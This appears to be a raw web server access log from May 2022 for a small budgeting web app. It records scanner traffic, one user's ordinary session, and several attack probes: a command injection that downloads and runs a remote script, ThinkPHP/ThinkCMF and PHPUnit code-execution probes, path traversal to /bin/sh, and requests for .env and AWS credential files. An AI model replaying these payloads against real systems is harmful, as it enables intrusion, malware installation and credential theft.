20.239.173.152 - - [12/May/2022:15:59:47 +0000] "HEAD /robots.txt HTTP/1.0" 404 175 "-" "-"
23.91.96.133 - - [12/May/2022:16:05:30 +0000] "GET / HTTP/1.1" 302 617 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
23.91.96.133 - - [12/May/2022:16:05:30 +0000] "GET /login?next=%2F HTTP/1.1" 200 3591 "http://174.138.17.206" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
23.91.96.133 - - [12/May/2022:16:05:31 +0000] "GET /favicon.ico HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
23.91.96.133 - - [12/May/2022:16:05:31 +0000] "GET /static/Javascript/index.js HTTP/1.1" 200 1153 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
51.254.59.113 - - [12/May/2022:16:08:18 +0000] "GET / HTTP/1.1" 302 617 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
51.254.59.113 - - [12/May/2022:16:08:19 +0000] "GET /login?next=%2F HTTP/1.1" 200 3591 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
94.102.61.10 - - [12/May/2022:16:51:49 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
94.102.61.10 - - [12/May/2022:16:51:50 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
42.237.109.199 - - [12/May/2022:16:57:39 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 407 "-" "-"
213.186.1.137 - - [12/May/2022:17:28:29 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
31.220.3.140 - - [12/May/2022:17:34:27 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 zgrab/0.x"
92.118.160.29 - - [12/May/2022:17:45:49 +0000] "GET / HTTP/1.1" 302 598 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
92.118.160.29 - - [12/May/2022:17:45:50 +0000] "GET /login?next=%2F HTTP/1.1" 200 3572 "http://174.138.17.206:80/" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
109.237.103.118 - - [12/May/2022:17:48:54 +0000] "GET /.aws/credentials HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118 - - [12/May/2022:17:48:54 +0000] "\x16\x03\x01\x01D\x01" 400 488 "-" "-"
185.254.196.223 - - [12/May/2022:17:53:09 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/May/2022:17:53:11 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2022:18:02:04 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [12/May/2022:18:02:05 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
139.162.167.216 - - [12/May/2022:18:38:33 +0000] "\x16\x03" 400 488 "-" "-"
139.162.167.216 - - [12/May/2022:18:38:33 +0000] "GET /j3Tk HTTP/1.1" 404 407 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
139.162.167.216 - - [12/May/2022:18:38:34 +0000] "GET /6zWV HTTP/1.1" 404 407 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
54.235.2.24 - - [12/May/2022:19:07:23 +0000] "GET / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3048.82 Safari/537.32"
54.235.2.24 - - [12/May/2022:19:07:23 +0000] "GET /login?next=%2F HTTP/1.1" 200 1801 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/51.0.3048.82 Safari/537.32"
34.140.248.32 - - [12/May/2022:19:33:13 +0000] "GET / HTTP/1.1" 302 654 "-" "python-requests/2.27.1"
185.180.143.8 - - [12/May/2022:19:54:15 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.8 - - [12/May/2022:19:54:15 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.212.227 - - [12/May/2022:20:02:55 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.9 - - [12/May/2022:20:40:51 +0000] "GET / HTTP/1.1" 302 598 "-" "-"
162.142.125.9 - - [12/May/2022:20:40:51 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.9 - - [12/May/2022:20:40:52 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
162.142.125.9 - - [12/May/2022:20:40:52 +0000] "GET /login HTTP/1.1" 200 1533 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.9 - - [12/May/2022:20:40:52 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
185.254.196.223 - - [12/May/2022:20:53:07 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/May/2022:20:53:07 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
159.65.166.179 - - [12/May/2022:20:54:05 +0000] "HEAD / HTTP/1.1" 302 418 "-" "Java/1.8.0_181"
159.65.166.179 - - [12/May/2022:20:54:06 +0000] "HEAD /login?next=%2F HTTP/1.1" 200 229 "-" "Java/1.8.0_181"
45.9.20.101 - - [12/May/2022:21:10:13 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
163.172.88.201 - - [12/May/2022:21:10:42 +0000] "GET ///.env HTTP/1.1" 404 444 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.62.1.el7.x86_64"
45.9.20.101 - - [12/May/2022:21:41:19 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [12/May/2022:22:02:54 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [12/May/2022:22:23:52 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
81.68.73.209 - - [12/May/2022:22:41:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+v1.kannimanelaji.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 444 "-" "Hello, world"
128.1.248.26 - - [12/May/2022:22:48:16 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [12/May/2022:22:48:16 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [12/May/2022:22:48:17 +0000] "HEAD /icons/sphere1.png HTTP/1.1" 200 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [12/May/2022:22:48:17 +0000] "HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [12/May/2022:22:48:18 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [12/May/2022:22:48:18 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.9.20.101 - - [12/May/2022:23:05:30 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 893 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [12/May/2022:23:05:31 +0000] "GET /login?next=%2F%3Fa%3Dfetch%26content%3D%253Cphp%253Edie%28%2540md5%28HelloThinkCMF%29%29%253C%252Fphp%253E HTTP/1.1" 200 1552 "http://174.138.17.206:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.240.236.109 - - [12/May/2022:23:08:40 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 zgrab/0.x"
52.173.31.82 - - [12/May/2022:23:17:35 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
52.173.31.82 - - [12/May/2022:23:17:36 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
45.9.20.101 - - [12/May/2022:23:29:08 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 719 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [12/May/2022:23:29:08 +0000] "GET /login?next=%2F%3FXDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 1552 "http://174.138.17.206:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.209.162 - - [12/May/2022:23:38:46 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.209.162 - - [12/May/2022:23:38:46 +0000] "GET /login?next=%2F HTTP/1.1" 200 1533 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [12/May/2022:23:54:07 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [12/May/2022:23:54:08 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [12/May/2022:23:59:11 +0000] "GET /console/ HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:00:15:46 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:00:53:35 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [13/May/2022:01:09:31 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:01:09:32 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.45 - - [13/May/2022:01:16:43 +0000] "GET / HTTP/1.1" 302 598 "-" "-"
167.94.138.45 - - [13/May/2022:01:16:43 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.45 - - [13/May/2022:01:16:44 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
167.94.138.45 - - [13/May/2022:01:16:44 +0000] "GET /login HTTP/1.1" 200 1533 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.45 - - [13/May/2022:01:16:44 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
45.9.20.101 - - [13/May/2022:01:28:33 +0000] "GET / HTTP/1.1" 302 617 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:01:28:34 +0000] "GET /login?next=%2F HTTP/1.1" 200 1552 "http://174.138.17.206:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.215.29 - - [13/May/2022:01:42:44 +0000] "MGLNDD_174.138.17.206_80\n" 400 488 "-" "-"
185.21.216.183 - - [13/May/2022:01:46:59 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
45.9.20.101 - - [13/May/2022:02:03:34 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.205.75.9 - - [13/May/2022:02:09:00 +0000] "GET / HTTP/1.0" 302 617 "-" "-"
45.9.20.101 - - [13/May/2022:02:51:37 +0000] "GET / HTTP/1.1" 302 617 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [13/May/2022:02:51:37 +0000] "GET /login?next=%2F HTTP/1.1" 200 1552 "http://174.138.17.206:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [13/May/2022:02:53:19 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/May/2022:02:53:20 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [13/May/2022:03:08:26 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [13/May/2022:03:10:13 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:03:10:13 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
121.200.9.14 - - [13/May/2022:04:14:57 +0000] "GET / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:57 +0000] "GET /login?next=%2F HTTP/1.1" 200 1801 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:58 +0000] "GET /static/css/main.css HTTP/1.1" 200 868 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:58 +0000] "GET /static/Javascript/index.js HTTP/1.1" 200 625 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:58 +0000] "GET /static/img/logo.png HTTP/1.1" 200 31062 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:58 +0000] "GET /static/img/background.jpeg HTTP/1.1" 200 537945 "http://174.138.17.206/static/css/main.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:14:59 +0000] "GET /favicon.ico HTTP/1.1" 404 443 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:02 +0000] "GET /sign-up HTTP/1.1" 200 1757 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:23 +0000] "POST /sign-up HTTP/1.1" 302 957 "http://174.138.17.206/sign-up" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:23 +0000] "GET / HTTP/1.1" 200 2550 "http://174.138.17.206/sign-up" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:28 +0000] "GET /income HTTP/1.1" 200 1745 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:31 +0000] "GET /expenses HTTP/1.1" 200 1760 "http://174.138.17.206/income" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:31 +0000] "GET /savingsgoals HTTP/1.1" 200 1752 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:32 +0000] "GET /income HTTP/1.1" 200 1745 "http://174.138.17.206/savingsgoals" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:16:48 +0000] "POST /income HTTP/1.1" 200 2159 "http://174.138.17.206/income" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:03 +0000] "POST /income HTTP/1.1" 200 2182 "http://174.138.17.206/income" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:06 +0000] "GET /expenses HTTP/1.1" 200 1760 "http://174.138.17.206/income" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:29 +0000] "POST /expenses HTTP/1.1" 200 2172 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:38 +0000] "POST /expenses HTTP/1.1" 200 2187 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:49 +0000] "POST /expenses HTTP/1.1" 200 2204 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:17:50 +0000] "GET / HTTP/1.1" 200 2199 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:09 +0000] "GET /logout HTTP/1.1" 302 764 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:09 +0000] "GET /login HTTP/1.1" 200 1595 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:12 +0000] "POST /login HTTP/1.1" 302 964 "http://174.138.17.206/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:12 +0000] "GET / HTTP/1.1" 200 2553 "http://174.138.17.206/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:14 +0000] "GET /logout HTTP/1.1" 302 763 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:04:18:14 +0000] "GET /login HTTP/1.1" 200 1595 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
51.79.29.48 - - [13/May/2022:05:06:10 +0000] "POST / HTTP/1.1" 302 654 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [13/May/2022:05:06:10 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.31.98.171 - - [13/May/2022:05:08:11 +0000] "GET / HTTP/1.1" 302 598 "-" "Mozilla/5.0 zgrab/0.x"
121.200.9.14 - - [13/May/2022:05:24:19 +0000] "GET / HTTP/1.1" 302 785 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:24:19 +0000] "GET /login?next=%2F HTTP/1.1" 200 1923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:24:19 +0000] "GET /static/Javascript/index.js HTTP/1.1" 200 625 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:29:54 +0000] "GET / HTTP/1.1" 302 785 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:29:54 +0000] "GET /login?next=%2F HTTP/1.1" 200 1923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:29:55 +0000] "GET /static/css/main.css HTTP/1.1" 200 867 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:00 +0000] "POST /login?next=%2F HTTP/1.1" 302 965 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:01 +0000] "GET / HTTP/1.1" 200 2553 "http://174.138.17.206/login?next=%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:03 +0000] "GET /income HTTP/1.1" 200 1862 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:05 +0000] "GET /expenses HTTP/1.1" 200 1884 "http://174.138.17.206/income" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:06 +0000] "GET /savingsgoals HTTP/1.1" 200 1752 "http://174.138.17.206/expenses" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:07 +0000] "GET / HTTP/1.1" 200 2199 "http://174.138.17.206/savingsgoals" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:13 +0000] "GET /logout HTTP/1.1" 302 764 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
121.200.9.14 - - [13/May/2022:05:30:13 +0000] "GET /login HTTP/1.1" 200 1595 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
138.118.234.134 - - [13/May/2022:05:41:43 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
